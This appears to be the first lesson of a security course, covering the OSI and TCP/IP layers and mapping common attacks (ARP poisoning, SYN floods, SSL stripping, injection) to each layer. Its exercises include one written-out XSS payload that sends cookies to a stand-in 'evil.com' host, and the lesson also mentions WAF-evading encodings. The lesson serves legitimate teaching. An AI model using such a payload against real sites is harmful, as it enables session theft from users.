---
title: "OSI Model and TCP/IP Stack — Layers, Encapsulation, and the Attacker Perspective"
tags: [foundation, networking, osi, tcp-ip, encapsulation, attacker-mindset]
module: 01-Foundation-01
day: 1
related_topics:
  - TCP/IP stack
  - Network scanning
  - Protocol analysis
  - Wireshark
---

# Day 001 — OSI Model and TCP/IP Stack

## Goals

By the end of this lesson you will be able to:

1. Name all seven OSI layers and state what each one does in one sentence.
2. Map real protocols (Ethernet, IP, TCP, HTTP, TLS) to their correct OSI layer.
3. Explain encapsulation — how data gains and loses headers as it moves down and up the stack.
4. Map the OSI model to the four-layer TCP/IP model used by the actual internet.
5. Look at any attack or vulnerability and identify which OSI layer it targets.
6. Explain why understanding layers is prerequisite to understanding attacks.

---

## Prerequisites

- You know what a computer network is at a high level (router, switch, cable).
- No prior security knowledge required. This is Day 1.

---

## Main Content

### 1. Why the Model Exists — and Why Attackers Care

Before OSI, every vendor built their own networking stack. IBM's network did not talk to DEC's.
The ISO published the OSI model in 1984 as a reference framework — a common vocabulary for how
data moves between machines regardless of hardware or vendor.

It is a **conceptual** model. No real protocol implements it exactly. What it gives you is a way
to reason about *where* in a communication stack something is happening.

> **Ghost's rule:** When you encounter any attack, your first question is: *which layer is being
> abused?* The answer tells you where to look, what to log, and what to fix. Without this model
> you are guessing. With it, you are reasoning.

Attackers use the OSI model constantly — not because they memorised it, but because it is the
fastest way to scope a problem. "Is this a Layer 2 problem (ARP) or a Layer 7 problem (HTTP)?"
is a diagnostic question that cuts hours off an investigation.

---

### 2. The Seven Layers

```
┌──────────────────────────────────────────────────────────┐
│  Layer 7 — Application   │  What the user/app sees       │
├──────────────────────────────────────────────────────────┤
│  Layer 6 — Presentation  │  Encoding, encryption, format │
├──────────────────────────────────────────────────────────┤
│  Layer 5 — Session       │  Session setup and teardown   │
├──────────────────────────────────────────────────────────┤
│  Layer 4 — Transport     │  End-to-end delivery, ports   │
├──────────────────────────────────────────────────────────┤
│  Layer 3 — Network       │  Logical addressing, routing  │
├──────────────────────────────────────────────────────────┤
│  Layer 2 — Data Link     │  Node-to-node, MAC frames     │
├──────────────────────────────────────────────────────────┤
│  Layer 1 — Physical      │  Bits on the wire / in the air│
└──────────────────────────────────────────────────────────┘
```

**Top-down mnemonic:** All People Seem To Need Data Processing
**Bottom-up mnemonic:** Please Do Not Throw Sausage Pizza Away

Pick one. Burn it in. You will use it every day.

---

### 3. Each Layer with an Attacker Lens

#### Layer 1 — Physical

**What it does:** Transmits raw bits as electrical signals, light pulses, or radio waves.
Cables, fibre, Wi-Fi radios, and NIC hardware live here.

**PDU:** Bit

**Attacker relevance:**
- Physical access to a cable = ability to tap it passively with no detection.
- Rogue Wi-Fi access points operate at the radio (Layer 1) level.
- Signal jamming is a Layer 1 denial-of-service.
- Evil-maid attacks require physical layer access first.

---

#### Layer 2 — Data Link

**What it does:** Delivers frames between directly connected nodes. Handles MAC addressing and
error detection. Subdivided into LLC (Logical Link Control) and MAC (Media Access Control).

**PDU:** Frame

**Key protocols:** Ethernet (802.3), Wi-Fi (802.11), ARP, PPP, VLANs (802.1Q)

**Attacker relevance:**
- **ARP poisoning:** ARP has zero authentication. Broadcast fake ARP replies → associate your
  MAC with the gateway IP → become the Man-in-the-Middle for all subnet traffic.
- **MAC flooding:** Flood a switch's CAM table → it degrades to a hub → all frames broadcast
  to all ports → passive eavesdrop on the entire segment.
- **VLAN hopping:** 802.1Q double-tagging allows crossing VLAN boundaries without authorisation.
- **Rogue DHCP:** Malicious DHCP server at Layer 2 redirects DNS + default gateway for every
  new device on the segment.

---

#### Layer 3 — Network

**What it does:** Routes packets across multiple networks using logical (IP) addresses. Routers
operate here. Every hop a packet takes involves a Layer 3 routing decision.

**PDU:** Packet

**Key protocols:** IPv4, IPv6, ICMP, IPSec, OSPF, BGP

**Attacker relevance:**
- **IP spoofing:** Source IP is not verified by default. Forge source → reflection/amplification
  DDoS (DNS, NTP, memcached).
- **ICMP recon:** Ping sweep discovers live hosts. ICMP type/code fingerprints OS.
- **BGP hijacking:** Nation-state actors reroute entire countries' traffic by injecting false
  routes (Rostelecom BGP hijack, 2020; Pakistan Telecom vs YouTube, 2008).
- **TTL manipulation:** Traceroute maps network topology by reading ICMP TTL exceeded messages.

---

#### Layer 4 — Transport

**What it does:** End-to-end delivery between processes. Port numbers multiplex multiple
application streams. TCP adds reliability; UDP trades reliability for speed.

**PDU:** Segment (TCP) / Datagram (UDP)

**Key protocols:** TCP, UDP, SCTP

**Attacker relevance:**
- **Port scanning:** Every service binds to a port. Scan ports → discover services (nmap
  operates at this layer primarily).
- **TCP SYN flood:** Send thousands of SYN packets without completing the handshake → exhaust
  half-open connection state (classic DDoS).
- **TCP session hijacking:** Predict sequence numbers → inject data into an existing session.
- **UDP amplification:** Small spoofed request to a UDP amplifier (DNS, NTP) → large response
  aimed at the victim.
- **Port-based firewall evasion:** Run C2 over port 443 to blend with HTTPS traffic.

---

#### Layer 5 — Session

**What it does:** Sets up, maintains, and terminates sessions between applications. In modern
practice this is largely absorbed into Layer 7 protocols.

**Key protocols:** NetBIOS, RPC, SMB session layer, PPTP control

**Attacker relevance:**
- **Session fixation:** Attacker sets a known session ID before auth; if the server does not
  issue a new ID post-login, the attacker has a valid authenticated session.
- **SMB relay:** NTLM authentication over SMB is captured and relayed (Responder + ntlmrelayx).

---

#### Layer 6 — Presentation

**What it does:** Translates data between network and application. Handles encoding (ASCII vs
UTF-8), serialisation formats, and encryption/decryption.

**Key protocols:** TLS/SSL (conceptually), MIME, ASN.1

**Attacker relevance:**
- **SSL stripping:** Downgrade HTTPS → HTTP by intercepting the initial unencrypted redirect
  (Moxie Marlinspike, DEFCON 2009).
- **Encoding attacks:** `../` as `%2e%2e%2f` or double-encoded to bypass WAF rules checking
  for path traversal literally.
- **Deserialisation vulnerabilities:** Attacker-controlled serialised data (Java, PHP, Python
  pickle, .NET BinaryFormatter) → arbitrary code execution.

---

#### Layer 7 — Application

**What it does:** The interface between network and the application. This is where user-facing
protocols live and where most modern attacks happen.

**Key protocols:** HTTP/HTTPS, DNS, SMTP, SSH, FTP, SNMP, LDAP, SMB

**Attacker relevance:** This is home territory.
- **SQLi, XSS, CSRF, SSRF, XXE, IDOR:** All application-layer vulnerabilities — the core of
  bug bounty hunting.
- **DNS poisoning:** Corrupt name resolution to redirect traffic transparently.
- **Credential attacks:** Brute force, credential stuffing, password spraying all target
  application authentication.
- **Protocol abuse:** SNMP default communities (`public`/`private`), anonymous LDAP bind,
  unauthenticated FTP, SMTP open relays.

---

### 4. The TCP/IP Model — What the Internet Actually Runs On

OSI is a reference. The TCP/IP model (also called the Internet model) is what real systems
implement. It collapses seven layers into four:

```
OSI Layers    TCP/IP Layer       Real protocol examples
─────────────────────────────────────────────────────────
7, 6, 5    →  Application        HTTP, DNS, SSH, SMTP, TLS
4          →  Transport          TCP, UDP
3          →  Internet           IPv4, IPv6, ICMP
2, 1       →  Network Access     Ethernet, Wi-Fi, ARP
```

When engineers say "Layer 3" they mean IP routing. When they say "Layer 4" they mean TCP/UDP.
CVEs, vendor advisories, and threat intel use OSI numbering. Know both; they map cleanly.

---

### 5. Encapsulation — How Data Actually Moves

When you send an HTTPS request, each layer wraps the data from the layer above it:

```
Application  →  HTTP request bytes
                ↓ TLS encrypts + wraps
Presentation →  TLS record
                ↓ TCP adds: src port 52431, dst port 443, seq/ack
Transport    →  TCP segment
                ↓ IP adds: src IP 10.0.0.5, dst IP 93.184.216.34
Network      →  IP packet
                ↓ Ethernet adds: src MAC aa:bb:cc:11:22:33, dst MAC (gateway)
Data Link    →  Ethernet frame
                ↓ NIC converts to electrical signals / radio waves
Physical     →  Bits on the wire
```

At the receiving end each layer strips its own header and passes the payload up. This is
**decapsulation**.

**Why this matters offensively:** Every header is data that can be forged, manipulated, or
inspected. Wireshark shows you every layer's headers simultaneously. A skilled attacker reads
a packet capture the way a mechanic reads an engine schematic — every field has meaning, and
anomalies reveal intent.

---

### 6. Attack-to-Layer Quick Reference

| Attack | Layer | Assumption violated |
|---|---|---|
| ARP spoofing | 2 | No authentication on ARP replies |
| MAC flooding | 2 | Switch CAM table is finite |
| IP spoofing | 3 | Source IP is not cryptographically bound to sender |
| TCP SYN flood | 4 | Server allocates state for half-open connections |
| Port scan | 4 | Services respond predictably on open ports |
| SSL stripping | 6 | Initial HTTP request is unencrypted |
| Deserialisation RCE | 6 | Deserialiser trusts object type information |
| SQL injection | 7 | Application does not separate code from data |
| XSS | 7 | Browser executes injected script in page context |
| DNS poisoning | 7 | DNS responses are not cryptographically verified |
| BGP hijacking | 3 | BGP peers trust route announcements by default |
| Session fixation | 5/7 | Session ID not rotated after login |

Build your own version of this table. Every CVE you read belongs in it.

---

## Key Takeaways

1. The OSI model is a **diagnostic vocabulary**. Every attack, every defence, every protocol
   sits at a specific layer. Knowing which layer tells you the scope of the problem.
2. **Layers 2, 3, 4** are the network attacker's playground: ARP poisoning, IP spoofing,
   SYN floods, port scanning, session hijacking.
3. **Layer 7** is where the majority of bug bounty findings live. Web vulns, credential
   attacks, protocol abuse — all here.
4. **Encapsulation = trust.** Each layer trusts the layers below it. When that trust is
   violated (spoofed headers, injected data), attacks succeed.
5. The **TCP/IP model** runs the internet. OSI is the reasoning framework. Both matter.

---

## Exercises

### Exercise 1 — Layer Classification

For each item, identify the OSI layer and write one sentence explaining your reasoning:

1. An Ethernet frame's destination MAC address.
2. The source IP address in a packet header.
3. A TCP destination port number (e.g. 443).
4. An HTTP `Cookie` header.
5. A TLS certificate presented during the handshake.
6. A Wi-Fi radio signal at 5 GHz.
7. A DNS `A` record response.
8. A TCP sequence number.
9. A VLAN tag in an 802.1Q frame.
10. A Python pickle object transmitted over a network socket.

---

### Exercise 2 — Attack Layer Mapping

For each attack scenario, identify: (a) which OSI layer is targeted, (b) what protocol
assumption is being violated.

1. An attacker on a shared Wi-Fi sends gratuitous ARP replies claiming their MAC is the
   router's IP. Other guests' traffic flows through the attacker's laptop.

2. A web application reflects user input in an HTML response without sanitisation. The
   attacker submits `<script>fetch('https://evil.com/?c='+document.cookie)</script>`.

3. An attacker sends 50 million small UDP packets to a public DNS resolver with a spoofed
   source IP (the victim's IP). The DNS resolver sends large responses to the victim.

4. A nation-state actor announces more-specific BGP routes for a target's IP prefix,
   causing all traffic destined for that company to route through the attacker's AS first.

5. An attacker intercepting a connection between a client and server downgrades the TLS
   connection to use export-grade 512-bit RSA keys (FREAK attack).

---

### Exercise 3 — Encapsulation Trace

Draw the full encapsulation stack for this scenario:

> You open a terminal and run `curl https://example.com/login -d "user=alice&pass=secret"`.
> Your machine IP: `192.168.1.100`. Server IP: `93.184.216.34`. Gateway MAC: `de:ad:be:ef:00:01`.

For each layer, state: what header/trailer is added, the key fields and their values.

---

### Lab Prep — Day 007

On Day 007 you will capture live traffic in Wireshark. Prepare by installing Wireshark on
your machine. Before the lab, you should be able to answer: *when Wireshark shows a packet,
what exactly am I looking at?* The answer is every layer's headers stacked exactly as
described in Section 5.

---

## Questions

<!-- Use this section to log your questions as you study. Ask Ghost to answer them,
     or write your own answer and ask for a review.
     Format: Q-001.1 Question → Answer → Q-001.1.1 Follow-up → etc. -->

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Next lesson: [Day 002 — IP Addressing, Subnetting and TCP State Machine](DAY-0002-IP-Subnetting-and-TCP-State-Machine.md)*
